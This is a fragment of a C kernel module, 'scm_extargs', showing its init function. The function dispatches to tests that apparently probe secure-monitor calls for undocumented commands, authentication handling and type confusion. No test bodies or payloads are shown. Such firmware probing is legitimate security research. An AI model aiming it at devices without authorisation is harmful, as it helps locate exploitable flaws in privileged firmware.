            }
        }
        msleep(10);
    }

    pr_info("scm_extargs: alt SVC scan complete\n");
}

static int __init scm_extargs_init(void)
{
    pr_info("scm_extargs: loaded, test=%d pid=%d\n", test, pid_val);

    switch (test) {
    case 0: test_compare_argcount(); break;
    case 1: test_ext_init_image(); break;
    case 2: test_ext_auth(); break;
    case 3: test_undocumented_cmds(); break;
    case 4: test_cross_svc(); break;
    case 5: test_full_cycle_ext(); break;
    case 6: test_type_confusion(); break;
    case 7: test_ac4_boundary(); break;
    case 8: test_alt_svc(); break;
    default:
        pr_info("scm_extargs: unknown test %d\n", test);
    }

    return -EAGAIN;
}

static void __exit scm_extargs_exit(void) {}

module_init(scm_extargs_init);
module_exit(scm_extargs_exit);
